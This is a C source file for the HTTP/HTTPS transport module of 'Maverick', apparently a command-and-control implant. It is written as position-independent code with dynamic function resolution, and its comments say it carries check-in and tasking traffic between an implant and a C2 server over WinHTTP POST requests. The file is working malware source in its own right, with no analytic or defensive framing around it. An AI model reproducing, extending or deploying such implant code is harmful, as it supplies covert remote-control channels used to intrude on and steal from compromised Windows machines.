/*
 * Maverick — Transport Module (PICO)
 *
 * HTTP/HTTPS transport using LibWinHttp. Sends POST requests to the C2 server
 * and returns the raw response body. Called by the entry module for both
 * checkin and task loop communication.
 *
 * go() signature matches TRANSPORT_FUNC in entry.c.
 */

#include <windows.h>
#include "includes/HTTP.h"

/* DFR declarations */
DECLSPEC_IMPORT void * __cdecl MSVCRT$malloc(size_t);
DECLSPEC_IMPORT void * __cdecl MSVCRT$memcpy(void *, const void *, size_t);

/*
 * Send an HTTP POST request and return the response body.
 * Caller owns the returned buffer (must free with MSVCRT$free).
 * Returns NULL on failure, sets *out_len to response size on success.
 */
char * go(char * host, int port, char * path, int ssl,
          char * body, int body_len, int * out_len) {

	*out_len = 0;

	HttpHandle *http = HttpInit(ssl ? 1 : 0);
	if (!http) return NULL;

	HttpURI uri = { host, (INTERNET_PORT)port, path };
	HttpResponse response = { 0 };
	HttpBody req_body = { 0 };

	if (body && body_len > 0) {
		req_body.data = (const BYTE *)body;
		req_body.size = (SIZE_T)body_len;
	}

	BOOL ok = HttpRequest(
		http,
		HTTP_METHOD_POST,
		&uri,
		NULL,
		(body && body_len > 0) ? &req_body : NULL,
		&response
	);

	if (!ok || !response.body || response.body_size == 0) {
		HttpDestroy(http);
		return NULL;
	}

	int resp_len = (int)response.body_size;
	char *result = (char *)MSVCRT$malloc(resp_len);
	if (result) {
		MSVCRT$memcpy(result, response.body, resp_len);
		*out_len = resp_len;
	}

	HttpDestroy(http);
	return result;
}
